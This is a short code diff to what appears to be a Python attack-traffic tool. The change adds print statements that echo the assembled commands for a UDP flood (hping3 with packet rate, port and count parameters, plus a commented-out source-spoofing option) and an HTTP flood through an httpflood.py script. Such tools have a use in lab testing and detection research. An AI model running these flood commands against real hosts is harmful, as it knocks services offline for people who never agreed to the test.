@@ -128,6 +128,8 @@ def udp_flood(dstIP, dstPort_type, pps, count):
         attack_command = f'sudo hping3 {dstIP} -2 -i u{interval_us} -p {dstPort} -c {count} -d {byte}'  # + ' --rand-source'
     elif dstPort_type == 2:
         attack_command = f'sudo hping3 {dstIP} -2 -i u{interval_us} -p ++1 -c {count} -d {byte}'  # + ' --rand-source'
+
+    print(attack_command)
     attack_command_list_form = attack_command.split(' ')
 
     log('Mid', attack_command)
@@ -141,6 +143,7 @@ def http_flood(target, dstPort, pps, count):
     print('[HTTP Flooding]')
     log('Start', attack_type='HTTP Flooding', param_info={'port': dstPort, 'pps': pps, 'count': count})
     attack_command = f'python3 httpflood.py -t {target} -p {dstPort} -i {pps} -c {count}'
+    print(attack_command)
     attack_command_list_form = attack_command.split(' ')
 
     log('Mid', attack_command)
